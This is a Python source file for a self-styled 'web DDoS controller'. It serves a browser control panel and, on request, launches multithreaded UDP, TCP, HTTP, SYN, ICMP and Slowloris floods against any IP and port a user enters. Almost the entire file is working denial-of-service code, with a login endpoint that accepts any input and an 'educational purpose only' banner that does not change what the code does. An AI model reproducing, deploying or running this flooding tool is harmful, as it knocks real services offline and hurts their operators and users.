#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════╗
║     YUAN'S WEB DDOS CONTROLLER - v3.0                   ║
║     Control your DDoS attacks from a web interface      ║
║              EDUCATIONAL PURPOSE ONLY                    ║
╚══════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import random
import threading
import socket
import struct
import ssl
import json
import hashlib
import base64
from datetime import datetime
from urllib.parse import urlparse
from http.server import HTTPServer, BaseHTTPRequestHandler
from collections import deque

# ==================== CONFIGURATION ====================
WEB_PORT = 8080
API_PORT = 8081
VERSION = "3.0 - WEB CONTROLLER"
CODENAME = "YUAN'S FURY"
SIGNATURE = "[ Yu4n_Ph4nt0m ]"
MAX_THREADS = 5000

# Yuan's epic messages
YUAN_MESSAGES = [
    "YUAN WON", "YUAN RULES", "YUAN OWNS", "YUAN KING", "YUAN GOD",
    "YUAN LEGEND", "YUAN VICTORY", "YUAN DOMINATES", "YUAN CONQUERS",
    "YUAN DESTROYS", "YUAN ANNIHILATES", "YUAN TERMINATES", "YUAN ELIMINATES",
    "YUAN ERASES", "YUAN OBLITERATES", "YUAN DECIMATES", "YUAN DEVASTATES"
]

# Attack state
current_attack = {
    'running': False,
    'target': '',
    'method': '',
    'threads': 0,
    'duration': 0,
    'start_time': 0,
    'packets_sent': 0,
    'bytes_sent': 0,
    'status': 'idle'
}

attack_thread = None
attack_lock = threading.Lock()

class Colors:
    """Elite color scheme"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    ORANGE = '\033[38;5;208m'
    PURPLE = '\033[38;5;129m'
    GOLD = '\033[38;5;220m'
    
    BOLD = '\033[1m'
    DIM = '\033[2m'
    BLINK = '\033[5m'
    UNDERLINE = '\033[4m'
    
    # Combinations
    YUAN = ORANGE + BOLD + BLINK
    SUCCESS = GREEN + BOLD
    ERROR = RED + BOLD
    WARNING = YELLOW + BOLD
    INFO = CYAN + BOLD
    BLOOD = RED + BOLD + BLINK

# ==================== DDoS ENGINE ====================

class PacketCounter:
    def __init__(self):
        self.sent = 0
        self.bytes = 0
        self.start = time.time()
        self.lock = threading.Lock()
        
    def add(self, packets=1, bytes=0):
        with self.lock:
            self.sent += packets
            self.bytes += bytes
            global current_attack
            with attack_lock:
                current_attack['packets_sent'] = self.sent
                current_attack['bytes_sent'] = self.bytes
            
    def get_stats(self):
        elapsed = time.time() - self.start
        with self.lock:
            return {
                'packets': self.sent,
                'bytes': self.bytes,
                'pps': int(self.sent / elapsed) if elapsed > 0 else 0,
                'bps': int(self.bytes / elapsed) if elapsed > 0 else 0,
                'elapsed': int(elapsed)
            }

class AttackEngine:
    def __init__(self, target, method, threads, duration):
        self.target = target
        self.method = method.upper()
        self.threads = min(threads, MAX_THREADS)
        self.duration = duration
        self.running = False
        self.counter = PacketCounter()
        
    def udp_flood(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = os.urandom(1024)
        while self.running:
            try:
                sock.sendto(data, self.target)
                self.counter.add(1, 1024)
            except:
                pass
                
    def tcp_flood(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect(self.target)
                sock.send(os.urandom(1024))
                self.counter.add(1, 1024)
                sock.close()
            except:
                pass
                
    def http_flood(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect(self.target)
                request = f"GET /?{random.randint(1,999999)} HTTP/1.1\r\n"
                request += f"Host: {self.target[0]}\r\n"
                request += f"User-Agent: {random.choice(YUAN_MESSAGES)}\r\n"
                request += "Accept: */*\r\n"
                request += "Connection: close\r\n\r\n"
                sock.send(request.encode())
                self.counter.add(1, len(request))
                sock.close()
            except:
                pass
                
    def syn_flood(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            while self.running:
                sock.sendto(os.urandom(40), self.target)
                self.counter.add(1, 40)
        except:
            pass
            
    def icmp_flood(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            while self.running:
                packet = struct.pack('!BBHHH', 8, 0, 0, 0, 1) + os.urandom(56)
                sock.sendto(packet, self.target)
                self.counter.add(1, 64)
        except:
            pass
            
    def slowloris(self):
        sockets = []
        while self.running:
            try:
                while len(sockets) < 100:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect(self.target)
                    sock.send(f"GET /?{random.randint(1,9999)} HTTP/1.1\r\nHost: {self.target[0]}\r\n".encode())
                    sockets.append(sock)
                    self.counter.add(1, 100)
                
                for sock in sockets[:]:
                    try:
                        sock.send(f"X-Yuan: {random.choice(YUAN_MESSAGES)}\r\n".encode())
                        self.counter.add(1, 50)
                    except:
                        sockets.remove(sock)
            except:
                pass
            time.sleep(5)
            
    def start(self):
        self.running = True
        global current_attack
        with attack_lock:
            current_attack['running'] = True
            current_attack['start_time'] = time.time()
            current_attack['status'] = 'running'
        
        # Select attack method
        method_map = {
            "UDP": self.udp_flood,
            "TCP": self.tcp_flood,
            "HTTP": self.http_flood,
            "SYN": self.syn_flood,
            "ICMP": self.icmp_flood,
            "SLOWLORIS": self.slowloris,
        }
        
        attack_func = method_map.get(self.method, self.tcp_flood)
        
        # Start threads
        workers = []
        for i in range(self.threads):
            t = threading.Thread(target=attack_func)
            t.daemon = True
            t.start()
            workers.append(t)
        
        print(f"{Colors.GREEN}[✓] Attack started: {self.method} on {self.target}{Colors.RESET}")
        
        # Run for duration
        time.sleep(self.duration)
        self.stop()
        
    def stop(self):
        self.running = False
        global current_attack
        with attack_lock:
            current_attack['running'] = False
            current_attack['status'] = 'stopped'
        print(f"{Colors.YELLOW}[!] Attack stopped{Colors.RESET}")

# ==================== WEB SERVER ====================

class WebHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            # Read and serve the HTML file
            html_file = os.path.join(os.path.dirname(__file__), 'ddos.html')
            if os.path.exists(html_file):
                with open(html_file, 'rb') as f:
                    self.wfile.write(f.read())
            else:
                self.wfile.write(b"<html><body><h1>ddos.html not found</h1></body></html>")
                
        elif self.path == '/api/status':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            
            with attack_lock:
                if current_attack['running']:
                    elapsed = int(time.time() - current_attack['start_time'])
                    remaining = max(0, current_attack['duration'] - elapsed)
                    rps = current_attack['packets_sent'] // max(elapsed, 1)
                else:
                    elapsed = 0
                    remaining = 0
                    rps = 0
                
                status = {
                    'running': current_attack['running'],
                    'status': current_attack['status'],
                    'target': current_attack['target'],
                    'method': current_attack['method'],
                    'threads': current_attack['threads'],
                    'duration': current_attack['duration'],
                    'elapsed': elapsed,
                    'remaining': remaining,
                    'packets': current_attack['packets_sent'],
                    'rps': rps,
                    'yuan_message': random.choice(YUAN_MESSAGES)
                }
            
            self.wfile.write(json.dumps(status).encode())
            
        elif self.path == '/favicon.ico':
            self.send_response(204)
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        if self.path == '/api/login':
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length > 0:
                post_data = self.rfile.read(content_length).decode()
                try:
                    data = json.loads(post_data)
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps({'success': True, 'message': 'Login successful'}).encode())
                    return
                except:
                    pass
            
            self.send_response(400)
            self.end_headers()
            
        elif self.path == '/api/start':
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length > 0:
                post_data = self.rfile.read(content_length).decode()
                try:
                    data = json.loads(post_data)
                    
                    # Parse target
                    target_str = data.get('target', '')
                    if ':' in target_str:
                        ip, port = target_str.split(':')
                        port = int(port)
                    else:
                        ip = target_str
                        port = 80
                    
                    threads = int(data.get('threads', 20))
                    duration = int(data.get('seconds', 30))
                    method = data.get('method', 'UDP').upper()
                    
                    global attack_thread
                    if attack_thread and attack_thread.is_alive():
                        with attack_lock:
                            current_attack['running'] = False
                        attack_thread.join(1)
                    
                    with attack_lock:
                        current_attack['target'] = target_str
                        current_attack['method'] = method
                        current_attack['threads'] = threads
                        current_attack['duration'] = duration
                        current_attack['packets_sent'] = 0
                        current_attack['bytes_sent'] = 0
                    
                    # Start attack in separate thread
                    attack_engine = AttackEngine((ip, port), method, threads, duration)
                    attack_thread = threading.Thread(target=attack_engine.start)
                    attack_thread.daemon = True
                    attack_thread.start()
                    
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps({'success': True, 'message': 'Attack started'}).encode())
                    return
                    
                except Exception as e:
                    self.send_response(500)
                    self.end_headers()
                    self.wfile.write(json.dumps({'success': False, 'error': str(e)}).encode())
                    return
            
            self.send_response(400)
            self.end_headers()
            
        elif self.path == '/api/stop':
            with attack_lock:
                current_attack['running'] = False
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'success': True, 'message': 'Attack stopped'}).encode())
    
    def log_message(self, format, *args):
        # Suppress default logging
        pass

# ==================== MAIN ====================

def print_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════════════╗
║              YUAN'S WEB DDOS CONTROLLER - v3.0                        ║
║              Control attacks from web interface                        ║
╠═══════════════════════════════════════════════════════════════════════╣
║                                                                       ║
║                    ⚠️  EDUCATIONAL PURPOSE ONLY  ⚠️                   ║
║                                                                       ║
╠═══════════════════════════════════════════════════════════════════════╣
║  Web Interface: http://localhost:{WEB_PORT}                          ║
║  API Endpoint:  http://localhost:{API_PORT}                          ║
╚═══════════════════════════════════════════════════════════════════════╝
{Colors.RESET}"""
    print(banner)

def main():
    os.system('clear')
    print_banner()
    
    print(f"{Colors.GREEN}[✓] Starting web server on port {WEB_PORT}{Colors.RESET}")
    print(f"{Colors.YELLOW}[!] Open http://localhost:{WEB_PORT} in your browser{Colors.RESET}")
    print(f"{Colors.RED}[!] Press Ctrl+C to stop{Colors.RESET}\n")
    
    try:
        server = HTTPServer(('0.0.0.0', WEB_PORT), WebHandler)
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Shutting down...{Colors.RESET}")
        with attack_lock:
            current_attack['running'] = False
        server.shutdown()
        print(f"{Colors.GREEN}[✓] Server stopped{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")

if __name__ == "__main__":
    main()